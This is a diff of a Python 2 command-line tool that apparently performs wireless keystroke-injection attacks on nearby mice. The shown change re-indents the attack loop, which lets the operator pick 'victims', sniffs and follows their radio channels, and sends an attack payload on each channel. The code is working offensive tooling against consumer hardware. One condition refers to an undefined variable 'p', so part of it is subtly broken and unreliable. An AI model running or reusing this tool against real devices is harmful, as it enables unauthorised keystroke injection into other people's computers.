@@ -391,73 +391,73 @@ def cli(debug, lowpower, interval):
     except KeyboardInterrupt:
       print "\n"
 
-      if 'devices' not in locals() or len(devices) == 0:
-        print R + "[!] " + W + "No devices found please try again..."
-        exit(-1)
-      
-      print GR + "\n[+]" + W + " select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
-            " separated by commas, or '%s': " % (G + 'all' + W),
-      value = click.prompt('', default="all")
-      value = value.strip().lower()
+    if 'devices' not in locals() or len(devices) == 0:
+      print R + "[!] " + W + "No devices found please try again..."
+      exit(-1)
+    
+    print GR + "\n[+]" + W + " select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
+          " separated by commas, or '%s': " % (G + 'all' + W),
+    value = click.prompt('', default="all")
+    value = value.strip().lower()
 
-      if value == "all":
-        victims = pretty_devices[:]
-      else:
-        victims = []
-        for vic in value.split(","):
-          if int(vic) <= len(pretty_devices):
-            victims.append(pretty_devices[(int(vic)-1)])
-          else:
-            print R + "[!] " + W + ("Device %d key is out of range" % int(vic))
+    if value == "all":
+      victims = pretty_devices[:]
+    else:
+      victims = []
+      for vic in value.split(","):
+        if int(vic) <= len(pretty_devices):
+          victims.append(pretty_devices[(int(vic)-1)])
+        else:
+          print R + "[!] " + W + ("Device %d key is out of range" % int(vic))
 
-      targets = []
-      for victim in victims:
-        if victim[1] in devices:
-          targets.append(devices[victim[1]])
+    targets = []
+    for victim in victims:
+      if victim[1] in devices:
+        targets.append(devices[victim[1]])
 
-      for target in targets:
-        payload = target['payload']
-        channels = target['channels']
-        address = target['address']
+    for target in targets:
+      payload = target['payload']
+      channels = target['channels']
+      address = target['address']
 
-        if len(payload) != 19 or payload[1] != 0x90:
-          print R + '[-] ' + W + "Target %s is not injectable or not a mouse. Skipping..." % (scan.hexify(address))
-          continue
+      if len(payload) != 19 or payload[1] != 0x90:
+        print R + '[-] ' + W + "Target %s is not injectable or not a mouse. Skipping..." % (scan.hexify(address))
+        continue
 
-        last_ping = time.time()
-        last_packet = time.time()
-        scan.sniff(address)
-        device = mouse(radio, address)
-        device.update(payload)
+      last_ping = time.time()
+      last_packet = time.time()
+      scan.sniff(address)
+      device = mouse(radio, address)
+      device.update(payload)
 
-        print GR + '[+] ' + W + "Waiting until channel is clear..."
-        while time.time() - last_packet > sniff_timeout:
-          # Follow the target device if it changes channels
-          if time.time() - last_ping > channel_timeout and device.pingable:
-            if scan.follow():
-              last_ping = time.time()
-
-          # Receive payload
-          value = radio.receive_payload()
-          if value[0] == 0:
-            # Reset the follow timer
+      print GR + '[+] ' + W + "Waiting until channel is clear..."
+      while time.time() - last_packet > sniff_timeout:
+        # Follow the target device if it changes channels
+        if time.time() - last_ping > channel_timeout and device.pingable:
+          if scan.follow():
             last_ping = time.time()
 
-            if len(payload) == 19 and p[1] == 0x90:
-              
-              # Reset the packet timer
-              last_packet = time.time()
+        # Receive payload
+        value = radio.receive_payload()
+        if value[0] == 0:
+          # Reset the follow timer
+          last_ping = time.time()
 
-              # Split the payload from the status byte
-              payload = value[1:]
+          if len(payload) == 19 and p[1] == 0x90:
+            
+            # Reset the packet timer
+            last_packet = time.time()
 
-              # Update the payload
-              device.update(payload)
-        
-        for channel in channels:
-          radio.set_channel(channel)
-          print GR + '[+] ' + W + 'Sending attack on channel %d' % (channel)
-          device.send_attack(attack)
+            # Split the payload from the status byte
+            payload = value[1:]
+
+            # Update the payload
+            device.update(payload)
+      
+      for channel in channels:
+        radio.set_channel(channel)
+        print GR + '[+] ' + W + 'Sending attack on channel %d' % (channel)
+        device.send_attack(attack)
 
   except KeyboardInterrupt:
     print '\n ' + R + '(^C)' + O + ' interrupted\n'
